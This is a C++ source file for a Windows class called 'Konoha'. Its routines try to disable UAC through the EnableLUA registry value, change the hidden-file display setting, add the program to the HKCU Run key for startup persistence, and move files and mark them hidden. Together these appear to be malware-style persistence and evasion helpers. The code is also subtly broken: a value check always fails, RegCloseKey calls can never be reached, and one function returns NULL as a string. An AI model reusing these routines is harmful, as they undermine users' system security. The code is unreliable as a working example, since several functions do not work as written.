#include "Konoha.h"

std::wstring Konoha::utf8_to_wstring(const std::string & str)
{
	std::wstring_convert<std::codecvt_utf8<wchar_t>> myconv;
	return myconv.from_bytes(str);
}

std::string Konoha::wstring_to_utf8(const std::wstring & str)
{
	std::wstring_convert<std::codecvt_utf8<wchar_t>> myconv;
	return myconv.to_bytes(str);
}

bool Konoha::changeValueRegistryUAC(int value)
{
	HKEY hkey;
	DWORD dwDisposition;

	if (value != 0 || value != 1)
	{
		printf("[-] Value must is 1 or 0!.");
		return false;
	}

	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR) TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"),
		0, NULL, 0,
		KEY_WRITE, NULL,
		&hkey, &dwDisposition) == ERROR_SUCCESS)
	{
		DWORD dwType, dwSize;
		dwType = REG_DWORD;
		dwSize = sizeof(DWORD);
		DWORD rofl = 0;
		if (RegSetValueEx(hkey, TEXT("EnableLUA"), value, dwType, (PBYTE)&rofl, dwSize) == ERROR_SUCCESS)
		{
			return true;
		}
		else {
			return false;
		}
		RegCloseKey(hkey);

	}
	else
	{
		printf("[-] Need to run as administrator !\n");
		return false;
	}
}

bool Konoha::changeValueRegistryShowALL(int value)
{
	HKEY hkey;
	DWORD dwDisposition;
	if (value != 0 || value != 1)
	{
		printf("[-] Value must is 1 or 0!.");
		return false;
	}

	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		(LPCSTR)TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL"),
		0, NULL, 0,
		KEY_WRITE, NULL,
		&hkey, &dwDisposition) == ERROR_SUCCESS)
	{
		DWORD dwSize;
		dwSize = sizeof(DWORD);
		DWORD rofl = 0;
		if (RegSetValueEx(hkey, TEXT("CheckedValue"), value, REG_DWORD, (PBYTE)&rofl, dwSize) == ERROR_SUCCESS)
		{
			return true;
		}
		else {
			return false;
		}
		RegCloseKey(hkey);

	}
	else
	{
		printf("[-] Need to run as administrator !\n");
		return false;
	}
}

std::wstring Konoha::s2ws(const std::string & s)
{
	int len;
	int slength = (int)s.length() + 1;
	len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
	wchar_t* buf = new wchar_t[len];
	MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
	std::wstring r(buf);
	delete[] buf;
	return r;
}

bool Konoha::setKeyStartupWithWindows(string name, string src)
{
	HKEY hkey;
	DWORD dwDisposition;
	if (RegCreateKeyExA(HKEY_CURRENT_USER,
		(LPCSTR) TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
		0, NULL, 0,
		KEY_WRITE, NULL,
		&hkey, &dwDisposition) == ERROR_SUCCESS)
	{
		TCHAR Path[80];
		ua_tcscpy_s(Path, CA2T(src.c_str())); //string to TCHAR
		if (RegSetValueEx(hkey,(LPCWSTR) s2ws(name).c_str(), 0, REG_SZ, (PBYTE)&Path, sizeof(Path)) == ERROR_SUCCESS)
		{
			return true;
		}
		else {
			return false;
		}
		RegCloseKey(hkey);
	}
	else
	{
		return false;
	}
}


std::wstring Konoha::getCurrentFolderAddress()
{
	PWSTR pszPath;
	HRESULT hr;
	hr = SHGetKnownFolderPath(FOLDERID_Documents, 0, NULL, &pszPath);
	if (SUCCEEDED(hr))
	{
		std::wstring path(pszPath);
		CoTaskMemFree(static_cast<LPVOID>(pszPath));
		return path;
	}
	else
	{
		return NULL;
	}
}

void Konoha::MoveFile(experimental::filesystem::path src, experimental::filesystem::path des)
{
	try {
		std::experimental::filesystem::copy(src, des);
		std::experimental::filesystem::remove(src);
	}
	catch (std::experimental::filesystem::filesystem_error& e) {
		std::cout << e.what() << '\n';
	}
	if (!SetFileAttributes(des.c_str(), 2))
	{
		ExitProcess(-1);
	}
}

wstring Konoha::getPathCurrent()
{
	wstring path = L"";
	TCHAR szExeFileName[MAX_PATH];
	GetModuleFileName(NULL, szExeFileName, MAX_PATH);

	path += szExeFileName;
	return path;
}
